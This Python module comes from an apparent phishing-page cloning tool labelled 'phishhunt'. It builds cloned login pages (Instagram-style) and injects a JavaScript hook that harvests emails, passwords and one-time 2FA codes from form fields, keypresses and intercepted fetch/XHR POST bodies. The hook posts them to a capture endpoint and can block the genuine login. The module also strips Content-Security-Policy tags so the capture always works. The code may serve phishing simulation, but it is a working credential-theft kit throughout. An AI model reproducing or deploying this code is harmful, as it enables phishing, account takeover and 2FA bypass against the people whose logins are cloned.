import json
import re

from pathlib import Path
from urllib.parse import urlparse

CLONE_USER_AGENT = (
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) "
    "AppleWebKit/537.36 (KHTML, like Gecko) "
    "Chrome/152.0.0.0 Safari/537.36"
)

MAX_HTML_SIZE = 10 * 1024 * 1024

DEFAULT_CAPTURE_FIELDS = [
    "email",
    "timestamp",
    "ip",
    "session",
]

CLONE_ASSETS_DIR = Path(__file__).resolve().parent.parent / "clone_assets"

# Instagram-style dark-mode hooks, feature-detected in the finalized HTML
# (NOT domain detection). When present, the clone is forced to the dark UI
# variant (html classes + theme-color/color-scheme metas) so it renders dark
# in any viewer regardless of the OS color scheme.
IG_DARK_MODE_HOOKS = ("__ig-dark-mode", "__fb-dark-mode")
DARK_THEME_CLASSES = ("_aa4d", "__fb-dark-mode", "__ig-dark-mode", "js-focus-visible")
IG_DARK_THEME_COLOR = "#242526"


# ============================================================
# BASIC HTML HELPERS
# ============================================================

def sanitize_html(html_content: str) -> str:
    if not isinstance(html_content, str):
        raise ValueError("HTML content must be text.")
    html_content = html_content.replace("\x00", "")
    result = []
    for char in html_content:
        code = ord(char)
        if char in ("\n", "\r", "\t"):
            result.append(char)
        elif code >= 32:
            result.append(char)
    return "".join(result)


def looks_like_html(html_content: str) -> bool:
    if not html_content:
        return False
    content = html_content.lower()
    return any(
        marker in content
        for marker in ("<!doctype html", "<html", "<head", "<body")
    )


def is_absolute(url: str) -> bool:
    return bool(urlparse(url).netloc)


def is_data_or_blob(url: str) -> bool:
    return url.startswith(
        ("data:", "blob:", "javascript:", "mailto:", "tel:", "about:", "vbscript:")
    )


def normalize_url(url: str) -> str:
    url = url.strip()
    if not url:
        raise ValueError("URL cannot be empty.")
    if not url.startswith(("http://", "https://")):
        url = "https://" + url
    parsed = urlparse(url)
    if parsed.scheme not in ("http", "https"):
        raise ValueError("Only HTTP and HTTPS URLs are supported.")
    if not parsed.hostname:
        raise ValueError("Invalid URL.")
    return url


# ============================================================
# CAPTURE / TELEMETRY SCRIPT
# ============================================================

def build_capture_script(
    capture_fields, page_id: int, passive: bool = False, button_capture: bool = False
) -> str:
    """
    Build the injected landing-page capture script.

    The injected client hook is UNIVERSAL: it reads credentials straight from
    the DOM (click / Enter / form-submit), from fetch() POST bodies and from
    XMLHttpRequest POST bodies — matching whatever mechanism the page's login
    uses, without depending on <form>, named inputs, or selectors.

    passive=True (full "as-is" clones with the site's own JS preserved): only
    observes. Never preventDefaults — the site keeps working normally.

    passive=False (static clones / operator templates): captures entered
    credentials and NEUTRALISES the page's own submission/navigation so the
    assigned behaviour (later wired in the Visual Editor) always wins.

    button_capture=True (hand-built static templates like instagram.html):
    additionally stops page-script navigation on credible login buttons so the
    page is left in place (no redirect) right after capture.
    """
    fields_json = json.dumps(capture_fields)
    page_id_str = str(page_id)
    passive_str = "true" if passive else "false"
    button_str = "true" if button_capture else "false"

    script = """
<script data-phishhunt="capture">
(function() {
    var CAPTURE_FIELDS = __FIELDS_JSON__;
    var PAGE_ID = __PAGE_ID__;
    var PASSIVE = __PASSIVE__;
    var BLOCK_CLICKS = __BUTTON_CAPTURE__;
    var ORIGIN = window.location.origin || "";

    var ENDPOINTS = [
        ORIGIN + "/captures/submit",
        ORIGIN + "/api/captures/submit"
    ];

    var CLICK_SEL = 'button, input[type="submit"], input[type="button"], [role="button"], a[href], .btn, [onclick]:not(input):not(select), [aria-label*="log in" i], [aria-label*="sign in" i], [aria-label*="signin" i], [data-testid*="login" i], [data-testid*="signin" i]';
    var INTERNAL_RE = /\\/captures\\/submit/;
    var seen = {};
    var seenCount = 0;

    function sendCapture(data) {
        var payload = [];
        Object.keys(data).forEach(function(k) {
            payload.push(encodeURIComponent(k) + "=" + encodeURIComponent(data[k] || ""));
        });
        var body = payload.join("&");
        var idx = 0;

        function beaconFallback(url) {
            try {
                if (navigator.sendBeacon) navigator.sendBeacon(url, body);
            } catch (e) {}
        }

        function tryNext() {
            if (idx >= ENDPOINTS.length) return;
            var url = ENDPOINTS[idx++];
            try {
                var xhr = new XMLHttpRequest();
                xhr.open("POST", url, true);
                xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
                xhr.onreadystatechange = function() {
                    if (xhr.readyState !== XMLHttpRequest.DONE) return;
                    if (xhr.status >= 200 && xhr.status < 300) return;
                    tryNext();
                };
                xhr.send(body);
            } catch (e) {
                beaconFallback(url);
                tryNext();
            }
        }
        tryNext();
    }

    function dedupe(info) {
        var fp = String(info.email || "") + "|" + String(info.password || "") + "|" +
                 String(info.otp || "") + "|" + String(info.hasPass || false);
        if (seen[fp]) return true;
        seen[fp] = 1;
        seenCount++;
        if (seenCount > 100) { seen = {}; seenCount = 0; }
        return false;
    }

    // ---- universal DOM credential reader ----
    function readFields(root) {
        var email = "", password = "", otp = "", hasPass = false, any = false;
        var bag = [];
        var scope = (root && root.querySelectorAll) ? root : document;
        var els = scope.querySelectorAll("input, textarea");
        for (var i = 0; i < els.length; i++) {
            var el = els[i];
            if (!el) continue;
            var tag = el.tagName.toLowerCase();
            var type = String(el.type || (tag === "textarea" ? "textarea" : "text")).toLowerCase();
            if (type === "hidden" || type === "checkbox" || type === "radio" || type === "submit" ||
                type === "button" || type === "image" || type === "reset" || type === "file" ||
                type === "color" || type === "range") continue;
            var val = String(el.value != null ? el.value : "").trim();
            var hints = String((el.id || "") + " " + (el.name || "") + " " + (el.placeholder || " ") + " " +
                              (el.getAttribute("aria-label") || " ") + " " + (el.className || " ") + " " +
                              (el.title || " ")).toLowerCase();
            if (type === "password" || (/(\\bpass|\\bpwd|password)/.test(hints) && !/username/.test(hints))) {
                if (val) { hasPass = true; any = true; if (!password) password = val; }
                continue;
            }
            var isOtp = /otp|one[- ]?time|2fa|two[- ]?factor|security code|authentication code|verification|verify|pin|token/.test(hints);
            if (isOtp && type !== "email") {
                if (val && !otp) { otp = val; any = true; }
                continue;
            }
            if (!val) continue;
            var score = 0;
            if (type === "email") score = 4;
            else if (type === "tel" || type === "number" || /phone|mobile|number/.test(hints)) score = 3;
            else if (/user|email|mail|login|account|identifier|handle|username/.test(hints)) score = 2;
            else if (/name/.test(hints)) score = 1;
            if (/^[^@\\s]+@[^@\\s]+$/.test(val)) score = Math.max(score, 3);
            bag.push({ val: val, score: score });
            any = true;
        }
        // No typed or hinted password field found: for plain two-field pages
        // the password input often has no distinguishing attributes, so fall
        // back to the LAST filled text-ish field (password conventionally
        // comes after the identifier).
        if (!hasPass && bag.length >= 2) {
            var lastBag = bag[bag.length - 1];
            password = lastBag.val;
            hasPass = true;
            bag.pop();
        }
        bag.sort(function(a, b) { return b.score - a.score; });
        if (bag.length) email = bag[0].val;
        return { email: email, password: password, otp: otp, hasPass: hasPass, any: any };
    }

    function submitInfo(info, event) {
        if (!info || !info.any) return;
        if (dedupe(info)) return;
        var out = { page_id: String(PAGE_ID), event: event, password_entered: info.hasPass ? "true" : "false" };
        if (CAPTURE_FIELDS.indexOf("email") >= 0 || info.email) out.email = info.email;
        if (info.password) out.password = info.password;
        if (info.otp) out.otp = info.otp;
        sendCapture(out);
    }

    // Is this element the page's login/submit control? Used to decide whether we
    // may neutralise the click's default action (never hijacks links like
    // "Forgot password", checkboxes, or the show-password toggle).
    function isLoginControl(el, form) {
        if (!el) return false;
        var tag = String(el.tagName || "").toLowerCase();
        var key = String((el.id || "") + " " + (el.className || "") + " " + (el.textContent || "") + " " +
                        (el.getAttribute && (el.getAttribute("aria-label") || " "))).toLowerCase();
        if (/log\\s*in|sign\\s*in|login|submit|signin|continue|next|verify/.test(key)) return true;
        if (tag === "input" && /submit|button/.test(String(el.type || "").toLowerCase())) return true;
        if (form && (tag === "button" || tag === "a" || (tag === "input" && String(el.type || "").toLowerCase() === "submit"))) {
            var defs = form.querySelectorAll('input[type="submit"], button[type="submit"], button:not([type])');
            for (var i = 0; i < defs.length; i++) if (defs[i] === el) return true;
        }
        return false;
    }

    function handleClick(e) {
        var target = e.target;
        var btn = (target && target.closest) ? target.closest(CLICK_SEL) : null;
        var scope = (btn && btn.closest && btn.closest("form")) || document;
        var info = readFields(scope);
        if (!info.any) return;
        submitInfo(info, "click_capture");
        if (PASSIVE || !info.hasPass) return;
        var form = (btn && btn.closest) ? btn.closest("form") : null;
        if (btn && isLoginControl(btn, form)) {
            e.preventDefault();
            if (BLOCK_CLICKS) {
                e.stopPropagation();
                e.stopImmediatePropagation();
            }
        }
    }

    function handleSubmit(e) {
        var form = e.target;
        if (!form || form.tagName !== "FORM") return;
        var info = readFields(form);
        if (!info.any) return;
        submitInfo(info, "form_submission");
        if (!PASSIVE) e.preventDefault();
    }

    document.addEventListener("click", handleClick, true);
    document.addEventListener("submit", handleSubmit, true);
    document.addEventListener("keydown", function(e) {
        if (e.key !== "Enter") return;
        var t = e.target;
        if (!t || !t.tagName) return;
        var tag = t.tagName.toLowerCase();
        if (tag !== "input" && tag !== "textarea") return;
        var scope = (t.closest && t.closest("form")) || document;
        var info = readFields(scope);
        if (info.hasPass) submitInfo(info, "enter_capture");
    }, true);

    // ---- network capture: fetch / XHR POST bodies ----
    function networkInfoFromPairs(pairs) {
        var email = "", password = "", otp = "", hasPass = false;
        for (var i = 0; i < pairs.length; i++) {
            var k = String(pairs[i][0] || "").toLowerCase();
            var v = String(pairs[i][1] == null ? "" : pairs[i][1]).trim();
            if (!v) continue;
            if (/pass|pwd/.test(k)) { hasPass = true; if (!password) password = v; }
            else if (/user|email|mail|login|account|identifier|handle|username/.test(k)) { if (!email) email = v; }
            else if (/otp|code|token|pin|phone|2fa/.test(k)) { if (!otp) otp = v; }
        }
        return { email: email, password: password, otp: otp, hasPass: hasPass, any: !!email || !!password || !!otp || hasPass };
    }

    function parseBody(body) {
        try {
            if (body == null) return { any: false };
            if (typeof FormData !== "undefined" && body instanceof FormData) {
                var pairs = [];
                body.forEach(function(v, k) { pairs.push([k, v]); });
                return networkInfoFromPairs(pairs);
            }
            if (typeof URLSearchParams !== "undefined" && body instanceof URLSearchParams) {
                var pairs2 = [];
                body.forEach(function(v, k) { pairs2.push([k, v]); });
                return networkInfoFromPairs(pairs2);
            }
            if (typeof body === "string") {
                var s = String(body);
                if (s.charAt(0) === "{") {
                    try {
                        var json = JSON.parse(s);
                        var pairs3 = [];
                        Object.keys(json).forEach(function(k) { pairs3.push([k, String(json[k])]); });
                        return networkInfoFromPairs(pairs3);
                    } catch (e) {}
                }
                var pairs4 = [];
                s.split("&").forEach(function(pair) {
                    var eq = pair.indexOf("=");
                    if (eq < 0) { pairs4.push([pair, ""]); return; }
                    try {
                        pairs4.push([
                            decodeURIComponent(pair.slice(0, eq).replace(/\\+/g, " ")),
                            decodeURIComponent(pair.slice(eq + 1).replace(/\\+/g, " "))
                        ]);
                    } catch (e) {}
                });
                return networkInfoFromPairs(pairs4);
            }
        } catch (e) {}
        return { any: false };
    }

    function sniffBody(url, body) {
        try {
            if (INTERNAL_RE.test(String(url || ""))) return;
            var info = parseBody(body);
            if (info.any) submitInfo(info, "network_capture");
        } catch (e) {}
    }

    // ---- window.fetch ----
    (function() {
        if (!window.fetch) return;
        var origFetch = window.fetch.bind(window);
        window.fetch = function(input, init) {
            try {
                var url = "", method = "", body = null;
                if (typeof input === "string") {
                    url = input;
                    method = String((init && init.method) || "GET").toUpperCase();
                    body = init && init.body != null ? init.body : null;
                } else if (input && typeof input === "object") {
                    url = input.url || "";
                    method = String((input.method || (init && init.method) || "GET")).toUpperCase();
                    body = init && init.body != null ? init.body : null;
                }
                if ((method === "POST" || method === "PUT") && body != null) sniffBody(url, body);
            } catch (e) {}
            return origFetch(input, init);
        };
    })();

    // ---- XMLHttpRequest ----
    try {
        var origOpen = XMLHttpRequest.prototype.open;
        var origSend = XMLHttpRequest.prototype.send;
        XMLHttpRequest.prototype.open = function(method, url) {
            try {
                this.__phMuMethod = String(method || "").toUpperCase();
                this.__phMuUrl = String(url || "");
            } catch (e) {}
            return origOpen.apply(this, arguments);
        };
        XMLHttpRequest.prototype.send = function(body) {
            try {
                if (body != null && (this.__phMuMethod === "POST" || this.__phMuMethod === "PUT")) {
                    sniffBody(this.__phMuUrl || "", body);
                }
            } catch (e) {}
            return origSend.apply(this, arguments);
        };
    } catch (e) {}
})();
</script>
"""

    return (
        script
        .replace("__FIELDS_JSON__", fields_json)
        .replace("__PAGE_ID__", page_id_str)
        .replace("__PASSIVE__", passive_str)
        .replace("__BUTTON_CAPTURE__", button_str)
    )


def _force_dark_theme(soup) -> None:
    """
    If the document ships Instagram-style dark-mode CSS variables, stamp the
    dark theme onto the <html> element and the theme-color/color-scheme metas
    so the clone renders in dark mode regardless of the viewer's OS preference.
    Feature-detected on the document's own CSS, so unrelated pages pass through
    untouched.
    """

    styles_text = "\n".join(
        (style.string or "") for style in soup.find_all("style")
    )
    if not any(hook in styles_text for hook in IG_DARK_MODE_HOOKS):
        return

    html = soup.find("html")
    if html is not None:
        classes = list(html.get("class") or [])
        for cls in DARK_THEME_CLASSES:
            if cls not in classes:
                classes.append(cls)
        html["class"] = classes
        if "data-js-focus-visible" not in html.attrs:
            html["data-js-focus-visible"] = ""

    for meta in soup.find_all("meta", attrs={"name": "theme-color"}):
        if "media" not in meta.attrs and meta.get("content"):
            meta["content"] = IG_DARK_THEME_COLOR

    for meta in soup.find_all("meta", attrs={"name": "color-scheme"}):
        meta["content"] = "dark"


def _strip_loading_overlays(soup) -> None:
    """
    Remove full-viewport boot overlays (Instagram's "logo" splash, generic
    loaders) that normally vanish via JS but would smother a static clone.
    """

    for el in list(soup.find_all(True)):
        attrs = el.attrs or {}
        id_attr = (attrs.get("id") or "").lower()
        cls = " ".join(attrs.get("class") or []).lower()

        splash_like_id = any(
            token in id_attr for token in ("splash", "loader", "loading", "boot", "overlay")
        )
        splash_like_cls = any(
            token in cls for token in ("splash", "loader", "loading")
        )
        contents = el.get_text(" ", strip=True)

        if not (splash_like_id or splash_like_cls):
            continue
        if "/splash" in id_attr or "splashscreen" in id_attr:
            el.decompose()
            continue

        style = attrs.get("style") or ""
        if (
            ("position:fixed" in style or "position: fixed" in style)
            and ("width:100%" in style or "width:100%;height:100%" in style)
        ):
            has_big_img = any(
                (img.get("height") or "").replace("px", "").strip().isdigit()
                and int((img.get("height") or "0").replace("px", "").strip()) >= 40
                for img in el.find_all("img")
            ) or bool(el.find("img", src=True))
            if has_big_img or "loading" in contents.lower() or "splash" in id_attr:
                el.decompose()
                continue

        if splash_like_cls and (
            "position:fixed" in style or "position: fixed" in style or "position:absolute" in style
        ):
            el.decompose()


def finalize_html(
    html: str,
    capture_fields,
    page_id: int,
    strip_scripts: bool = False,
    passive_capture: bool = False,
    prefers_dark: bool = True,
    button_capture: bool = False,
) -> str:
    from bs4 import BeautifulSoup

    html = sanitize_html(html)
    soup = BeautifulSoup(html, "lxml")

    # Cloned templates sometimes ship a restrictive <meta> Content-Security-Policy
    # that blocks connect-src (killing /captures/submit) while still allowing
    # inline scripts. Strip it so credential capture always works.
    for meta in soup.find_all("meta", attrs={"http-equiv": re.compile(r"content-security-policy", re.I)}):
        meta.decompose()

    if strip_scripts:
        for node in soup.find_all("script"):
            node.decompose()
        for node in soup.find_all("noscript"):
            node.decompose()

    # Inline event handlers only get removed from sanitized (script-stripped)
    # clones. Full "as-is" clones keep the site's own JS and handlers intact.
    if strip_scripts:
        for tag in soup.find_all(True):
            for attr in [a for a in tag.attrs]:
                if attr.lower().startswith("on"):
                    del tag.attrs[attr]

    # Strip inline mount-"content-visibility" styles that keep JS-less clones
    # blank, then inject a small CSS override so nothing is hidden pre-interaction.
    for mount in soup.find_all("div", id=re.compile(r"^mount_")):
        style = mount.get("style", "")
        new_style = re.sub(r"content-visibility\s*:\s*hidden\s*;?", "", style).strip()
        if new_style:
            mount["style"] = new_style
        elif "style" in mount.attrs:
            del mount.attrs["style"]

    head = soup.head
    if head is None:
        head = soup.new_tag("head")
        html_root = soup.html
        if html_root is not None:
            html_root.insert(0, head)
        else:
            soup.insert(0, head)

    # Inject the CSS override as a bare <style> tag. Parsing a fragment with
    # "lxml" auto-wraps it in <html><head>…</head></html>, and appending that
    # soup embeds a nested document inside the real <head>. Build the tag
    # directly so the serialized output stays flat.
    style_tag = soup.new_tag("style", attrs={"data-phishhunt-clone": "true"})
    style_tag.string = (
        "[content-visibility]{content-visibility:visible!important}"
        "[style*=content-visibility]{content-visibility:visible!important}"
        "*{visibility:visible!important;opacity:1!important}"
    )
    head.append(style_tag)

    _strip_loading_overlays(soup)

    if prefers_dark:
        _force_dark_theme(soup)

    if not soup.find("script", {"data-phishhunt": "capture"}):
        capture_script = BeautifulSoup(
            build_capture_script(
                capture_fields,
                page_id,
                passive=passive_capture,
                button_capture=button_capture,
            ),
            "html.parser",
        )
        # Inject FIRST in <head> so the fetch/XHR wrappers are installed before
        # the cloned site's own scripts run.
        for child in reversed(capture_script.contents):
            head.insert(0, child)

    return sanitize_html(str(soup))